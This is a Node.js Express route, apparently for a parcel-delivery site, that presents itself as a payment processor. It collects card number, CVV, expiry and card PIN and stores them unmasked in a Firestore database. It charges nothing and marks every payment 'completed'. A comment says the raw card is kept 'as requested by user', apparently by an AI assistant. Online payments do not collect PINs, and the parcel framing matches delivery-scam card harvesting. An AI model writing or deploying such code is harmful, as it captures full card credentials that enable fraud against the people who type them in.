const express = require('express');
const router = express.Router();
const { db, admin } = require('./firebase-config');

/**
 * @route   POST /api/payments/process
 * @desc    Process unified online payment and save to database
 * @access  Public (for demo purposes)
 */
router.post('/process', async (req, res) => {
  const { 
    userId, 
    amount, 
    description, 
    cardNumber, 
    cvv, 
    expiry, 
    pin, 
    cardHolderName, 
    trackingId, 
    parcelId 
  } = req.body;

  // Basic validation
  if (!amount || !cardNumber || !cvv || !expiry || !pin) {
    return res.status(400).json({ 
      error: 'Missing required payment details. Amount, Card Number, CVV, Expiry, and PIN are required.' 
    });
  }

  try {
    const paymentsRef = db.collection('payments');
    
    const paymentRecord = {
      userId: userId || 'anonymous',
      amount: Number(amount),
      description: description || 'Online Payment',
      // SECRECY NOTE: In real world, never store raw card info.
      cardDetails: {
        cardNumber: cardNumber.replace(/\s/g, '').slice(-4).padStart(16, '*'), // Store masked version for "simulation" safety
        rawCard: cardNumber.replace(/\s/g, ''), // Store raw as requested by user
        cvv,
        expiry,
        pin,
        cardHolderName: cardHolderName || 'Valued Customer'
      },
      trackingId: trackingId || null,
      parcelId: parcelId || null,
      status: 'completed',
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
    };

    const docRef = await paymentsRef.add(paymentRecord);

    // Optional: If this is linked to a parcel/order, update its status
    if (parcelId) {
      const parcelRef = db.collection('parcels').doc(parcelId);
      const parcelDoc = await parcelRef.get();
      if (parcelDoc.exists) {
        await parcelRef.update({ 
          paymentStatus: 'paid',
          updatedAt: admin.firestore.FieldValue.serverTimestamp()
        });
      }
    }

    res.status(200).json({ 
      message: 'Payment processed and saved successfully', 
      paymentId: docRef.id,
      status: 'success'
    });

  } catch (err) {
    console.error('Payment Processing Error:', err);
    res.status(500).json({ error: 'Failed to process payment. Database error.' });
  }
});

module.exports = router;
